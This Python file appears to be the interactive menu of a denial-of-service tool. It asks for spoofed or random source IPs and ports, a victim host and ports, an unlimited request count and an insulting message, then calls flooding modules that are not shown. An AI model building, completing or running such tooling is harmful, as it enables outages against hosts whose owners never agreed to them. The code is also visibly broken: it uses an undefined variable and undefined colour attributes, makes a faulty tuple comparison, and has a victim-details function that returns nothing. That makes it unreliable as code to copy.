'runs a dos attack . use it legaly'
import os
from ui_core.coloring import Color, ask_for, notify
from lib.randoms import random_ip, random_int
from lib.dos import SS, SM, MS, MM
from lib._errors import BackToMainMenu
dos_dict = {'1': SS.Run, '2': SM.Run, '3': MS.Run, '4': MM.Run}
if os.name == 'nt':
    from colorama import init
    init(convert=True)


class Main:
    'makes using dos modules possible'

    def __init__(self):

        _, red, green, yellow, blue, magenta, _, _, reset = Color().GetAllColors()
        print(
            "What is The Type For Now Only TCP Supported : \n"
            f"{self.red}{{1}}--> SS (Single Ip , Single Port)\n"
            f"{self.green}{{2}}--> SM (Single Ip , Multiple Ports)\n"
            f"{self.blue}{{3}}--> MS (Multiple Ips , Single Ports)\n"
            f"{self.yellow}{{4}}--> MM (Multiple Ips , Multiple Ports)\n"
            f"{self.red}{{000}}--> Back To Main Menu" + reset

        )
        choice = str(input("..> "))
        if index == "000":
            raise BackToMainMenu
        elif choice in ("1", "2", "3", "4"):
            info = self.get_info(choice)
            self.run(choice, info)

    def _get_source_details(self, choice):
        if choice in ("3", "4"):
            source_ip = ask_for("Whats The Ip Addresses You Want To Attack From . " +
                                "Seperate them by using spaces : ", 'Using \\| As Source Ip.',
                                type=list)
        else:
            source_ip = ask_for(
                "Whats The Ip Address You Want To Attack From . " +
                "Press Enter(Left Empty) To Use A Random Ip : ", 'Using \\| As Source Ip.',
                default=['', random_ip])

        temp = int(random_int(1100, 4000))
        source_port = ask_for("Whats The Port You Want To Attack From "
                              "Left To '-1' To Use A Random Port : ", "Using \\| As Source Port.",
                              type=int, default=[-1, temp])
        return source_ip, source_port

    def _get_victim_details(self, choice):
        victim_ip = ask_for("Whats The Host, Name Or IP You Want To Attack To : ",
                            "Using Ip Or Hostname \\| As Victim Ip")

        if choice == ("2", "4"):
            victim_ports = ask_for(
                "What Are The Ports You Want To Attack To . Press Enter (Left Empty) To Use \
                [80, 443] : ",
                "Using \\| As Victim Ports.", type=list, default=['', [80, 443]])
        else:
            victim_port = ask_for(
                "Whats The Port You Want To Attack To . Left to -1 To Use 80 : ",
                "Using \\| As Victim Port.", type=int, default=[-1, 80])

    def get_info(self, choice):
        'gets info from user'
        sd = self._get_source_details(choice)
        vd = self._get_victim_details(choice)
        count = ask_for(
            "How Much Requests Do You Want To Send (-1 For Infinite) : ", "Count Is \\|")
        message = ask_for("Message For Your Victim Press Enter (Left Empty) To Use 'Fuck You' : ",
                          "Using \\| As A Message For Victim", default=['', 'Fuck You'])
        return (sd, vd, int(count), message)

    @staticmethod
    def run(choice, info):
        'Runs a dos attack'
        try:
            dos_dict[choice](*info)
        except (EOFError, KeyboardInterrupt):
            notify("report", "User Requested An Exit.")
